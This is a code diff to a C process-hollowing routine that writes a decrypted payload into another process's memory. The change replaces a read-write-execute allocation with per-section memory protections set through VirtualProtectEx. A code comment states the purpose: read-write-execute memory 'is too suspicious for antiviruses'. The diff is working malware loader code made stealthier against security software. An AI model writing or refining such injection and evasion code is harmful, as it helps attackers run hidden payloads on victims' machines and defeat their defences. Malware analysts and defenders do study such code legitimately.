@@ -52,7 +52,7 @@ int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
         (LPVOID)(ctx.NtHeader->OptionalHeader.ImageBase),
         ctx.NtHeader->OptionalHeader.SizeOfImage,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
+        PAGE_READWRITE
     );
 
     if (!ctx.pImageBase)
@@ -76,6 +76,36 @@ int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize)
             (LPVOID)((uintptr_t)ctx.pe + ctx.SectionHeader->PointerToRawData),
             ctx.SectionHeader->SizeOfRawData,
             NULL
+        );
+
+        /* Set correct memory protection for each section. 
+        Because PAGE_EXECUTE_READWRITE is too suspicious for antiviruses */
+        
+        DWORD protect = PAGE_NOACCESS;
+        DWORD chars = ctx.SectionHeader->Characteristics;
+        if (chars & IMAGE_SCN_MEM_EXECUTE)
+        {
+            if (chars & IMAGE_SCN_MEM_WRITE)
+                protect = PAGE_EXECUTE_READWRITE;
+            else if (chars & IMAGE_SCN_MEM_READ)
+                protect = PAGE_EXECUTE_READ;
+            else
+                protect = PAGE_EXECUTE;
+        } else {
+            if (chars & IMAGE_SCN_MEM_WRITE)
+                protect = PAGE_READWRITE;
+            else if (chars & IMAGE_SCN_MEM_READ)
+                protect = PAGE_READONLY;
+            else
+                protect = PAGE_NOACCESS;
+        }
+        DWORD oldProtect;
+        VirtualProtectEx(
+            ctx.PI.hProcess,
+            (LPVOID)((uintptr_t)ctx.pImageBase + ctx.SectionHeader->VirtualAddress),
+            ctx.SectionHeader->Misc.VirtualSize,
+            protect,
+            &oldProtect
         );
     }
 
